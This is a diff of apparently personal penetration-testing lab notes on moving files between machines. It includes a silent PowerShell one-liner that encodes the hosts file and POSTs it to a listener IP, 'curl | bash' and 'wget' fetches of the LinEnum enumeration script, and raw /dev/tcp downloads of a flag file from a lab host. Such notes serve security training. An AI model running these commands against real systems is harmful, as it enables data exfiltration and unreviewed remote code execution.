@@ -77,8 +77,9 @@ Step 2   > certutil -encode C:\Windows\System32\drivers\etc\hosts C:\Users\2Pira
 Step 2   Alternative   #### Oneliner to Base64 encode file with certutil into TEMP file certcheck.b64 and send to Netcat listener, 2 sec then command stops and dont wait for response also NO OUTPUT.  
 > $TempFile = "$env:TEMP\certcheck.b64"; certutil -encode C:\Windows\System32\drivers\etc\hosts $TempFile | Out-Null; $b64 = Get-Content -Path $TempFile -Raw; Remove-Item -Path $TempFile -Force; try { Invoke-WebRequest -Uri http://10.10.10.124:80/ -Method POST -Body $b64 -ContentType "text/plain" -ErrorAction Stop -TimeoutSec 2 | Out-Null } catch { $null }
 
-
-
+1. certutil -encode upload_nix.zip upload.b64
+2. echo -n 'UEsDBA75fqG1gHXAAA=' | base64 -d > upload_nix.zip
+3. gunzip -S .zip upload_nix.zip   
 
 
 #################################################################################################
@@ -91,9 +92,9 @@ $ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Script
 $ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
 
 #When none well-known file transfer tools are available. Built-in /dev/TCP device file can be used for simple file downloads.
-Step 1 $ exec 3<>/dev/tcp/10.10.10.32/80               #connect to web server
-Step 2 $ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3     #get data
-Step 3 $ cat <&3                                       #Print the Response
+Step 1 $ exec 3<>/dev/tcp/10.129.199.69/80                                                               #connect to web server
+Step 2 $ echo -e "GET /flag.txt HTTP/1.1\r\nHost: 10.129.199.69\r\nConnection: close\r\n\r\n" >&3      #get data
+Step 3 $ cat <&3                                                                                       #Print the Response
 
 
 
